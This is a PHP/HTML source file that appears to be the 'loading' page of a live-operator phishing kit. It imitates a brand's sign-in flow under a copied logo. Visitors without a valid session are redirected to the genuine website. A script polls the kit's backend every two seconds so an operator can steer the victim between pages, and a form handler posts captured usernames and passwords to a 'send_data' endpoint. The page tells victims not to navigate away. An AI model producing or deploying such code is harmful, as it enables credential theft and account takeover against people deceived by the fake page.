<?php
require_once('shade/core/functions.php');

if($_SESSION['is_valid'] != 1)
{
    die('<script>window.location.href = "'.REAL_WEBSITE.'";</script>');
    return;
}
?>

<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link href="/assets/page/bootstrap.min.css" rel="stylesheet">
    <link href="/assets/page/font-awesome.min.css" rel="stylesheet">
    <link href="/assets/page/style.css" rel="stylesheet">
    <title>Sign-In</title>
  </head>
  <body>
    <div class="row p-4">
      <div class="col-6">
        <svg height="28" viewBox="0 0 158 28" xmlns="http://www.w3.org/2000/svg" class="Header__Logo" role="button" style="
            width: 112px;
            height: 20px;
            margin-top: 2px;
            fill: #FFFFFF;
            cursor: pointer;
          ">
            <path d="M31.6354 7.81707C25.9412 7.81707 21.492 12.1397 21.492 17.9263C21.492 23.713 25.8287 27.9986 31.6354 27.9986C37.442 27.9986 41.8541 23.639 41.8541 17.8893C41.8541 12.1766 37.5174 7.81707 31.6354 7.81707ZM31.6738 23.8283C28.4311 23.8283 26.055 21.3098 26.055 17.9277C26.055 14.5072 28.3927 11.9903 31.6354 11.9903C34.9164 11.9903 37.2911 14.5456 37.2911 17.9277C37.2911 21.3098 34.9164 23.8283 31.6738 23.8283ZM43.0977 12.215H45.9261V27.6244H50.4508V8.19271H43.0977V12.215ZM10.105 11.9888C12.4811 11.9888 14.3664 13.4543 15.0821 15.6341H19.8713C19.0034 10.9743 15.1575 7.81707 10.1434 7.81707C4.4492 7.81707 0 12.1397 0 17.9277C0 23.7158 4.33681 28 10.1434 28C15.0451 28 18.9664 24.8427 19.8343 20.1445H15.0821C14.4034 22.3243 12.5181 23.8283 10.142 23.8283C6.86092 23.8283 4.56159 21.3098 4.56159 17.9277C4.56304 14.5072 6.82535 11.9888 10.105 11.9888ZM129.068 16.0482L125.75 15.5601C124.167 15.3353 123.036 14.8089 123.036 13.5682C123.036 12.215 124.507 11.5392 126.504 11.5392C128.692 11.5392 130.087 12.4783 130.389 14.0192H134.763C134.272 10.1107 131.255 7.81848 126.618 7.81848C121.829 7.81848 118.662 10.2615 118.662 13.719C118.662 17.0257 120.736 18.9437 124.921 19.5441L128.239 20.0321C129.861 20.2569 130.766 20.8972 130.766 22.0995C130.766 23.6404 129.182 24.2793 126.995 24.2793C124.317 24.2793 122.809 23.1894 122.583 21.5361H118.134C118.549 25.3322 121.527 28 126.957 28C131.897 28 135.177 25.7448 135.177 21.8732C135.177 18.4158 132.802 16.6116 129.068 16.0482ZM48.1884 0.187814C46.5294 0.187814 45.2848 1.39011 45.2848 3.04345C45.2848 4.69678 46.5281 5.89907 48.1884 5.89907C49.8474 5.89907 51.0926 4.69678 51.0926 3.04345C51.0926 1.39011 49.8474 0.187814 48.1884 0.187814ZM114.59 14.8459C114.59 10.6371 112.026 7.81848 106.596 7.81848C101.468 7.81848 98.6024 10.4123 98.0363 14.3962H102.524C102.75 12.8553 103.957 11.5776 106.521 11.5776C108.822 11.5776 109.953 12.5921 109.953 13.8328C109.953 15.4492 107.878 15.8618 105.314 16.125C101.845 16.5006 97.5468 17.7029 97.5468 22.2133C97.5468 25.7092 100.149 27.963 104.297 27.963C107.539 27.963 109.575 26.6099 110.594 24.4671C110.745 26.3837 112.178 27.6244 114.177 27.6244H116.816V23.6034H114.591V14.8459H114.59ZM110.14 19.7319C110.14 22.3257 107.878 24.2423 105.125 24.2423C103.428 24.2423 101.995 23.528 101.995 22.0255C101.995 20.1089 104.295 19.5825 106.407 19.3577C108.443 19.1699 109.574 18.7188 110.14 17.8538V19.7319ZM86.1214 7.81707C83.5944 7.81707 81.4831 8.86996 79.975 10.6357V0H75.4504V27.6244H79.8993V25.069C81.4074 26.9101 83.5577 28 86.1214 28C91.5508 28 95.6616 23.7158 95.6616 17.9277C95.6616 12.1397 91.4756 7.81707 86.1214 7.81707ZM85.4429 23.8283C82.2001 23.8283 79.8241 21.3098 79.8241 17.9277C79.8241 14.5456 82.2373 11.9903 85.4796 11.9903C88.7609 11.9903 91.0599 14.5087 91.0599 17.9277C91.0599 21.3098 88.6852 23.8283 85.4429 23.8283ZM64.6279 7.81707C61.6871 7.81707 59.7634 9.01937 58.6324 10.7111V8.19271H54.1446V27.623H58.6692V17.0627C58.6692 14.0932 60.5544 11.9888 63.3448 11.9888C65.947 11.9888 67.5675 13.83 67.5675 16.4992V27.6244H72.0921V16.162C72.0939 11.2746 69.5682 7.81707 64.6279 7.81707ZM156.745 17.2889C156.745 11.727 152.673 7.81848 147.205 7.81848C141.399 7.81848 137.137 12.1781 137.137 17.9277C137.137 23.9791 141.7 28 147.281 28C151.995 28 155.69 25.2184 156.632 21.2728H151.918C151.239 23.0016 149.58 23.9791 147.355 23.9791C144.451 23.9791 142.264 22.1749 141.774 19.0176H156.744V17.2889H156.745ZM142.039 15.785C142.756 13.0787 144.792 11.764 147.13 11.764C149.694 11.764 151.655 13.2295 152.107 15.785H142.039Z" fill-rule="evenodd"></path>
          </svg>
      </div>
      <div class="col-6"> 
        <a href="#" class="navbtn" style="margin-right:35px;"><i class="fa fa-bars" style="font-size:16px" aria-hidden="true"></i>
        </a>
      </div>
    </div>
    
    <div class="p-3">
      <br>
      <br>
      <!-- <img src="/assets/page/loading.svg" class="loading" style="display: block; margin-left: auto; margin-right: auto; width: 40%;"/> -->
      <svg class="spinner" viewBox="0 0 50 50">
        <circle class="path" cx="25" cy="25" r="20" fill="none" stroke-width="5"></circle>
      </svg>
      <br>
      <p class="text-center">Please wait while we process your request. Due to high amounts of traffic, this may take a few minutes.</p>
      <p class="text-center"><strong>Do not navigate away from this page.</strong></p>
    </div>
    <script src="/assets/page/bootstrap.min.js"></script>

    <!-- DONT REMOVE THIS PART -->
    <script src="/assets/jquery-3.5.1.min.js" ></script>
    <script>
        var allow_redirect = true;
        var current_page = 'loading';
        
        setTimeout(heartbeat, 2000);

        function heartbeat() {
            if (allow_redirect) {
                $.get("/shade/core/ajax.php?action=heartbeat", {
                        currentpage: current_page
                    })
                    .done(function (data) {
                      if(data == "finish")
                      {
                          window.location.href = "<?=REAL_WEBSITE?>";
                          return;
                      }
                      if (data == "refresh") {
                          window.location.href =
                              "/" + current_page+ '.php?error=1';
                          return;
                      }
                      if (data != current_page) {
                          window.location.href = "/" + data + '.php';
                      }
                    });
            }
            setTimeout(heartbeat, 2000);
        }


        $("#loginForm").submit(function (event) {
            var _username = $('#username').val();
            var _password = $('#password').val();
            
            if(_username == "" || _password == "")
            {
                return false;
            }

            $.post("/shade/core/ajax.php?action=send_data", {
                    currentpage: current_page,
                    username: _username,
                    password: _password
                })
                .done(function (data) {
                    allow_redirect = true;
                });

            event.preventDefault();
            return false;
        });

    </script>
  </body>
</html>

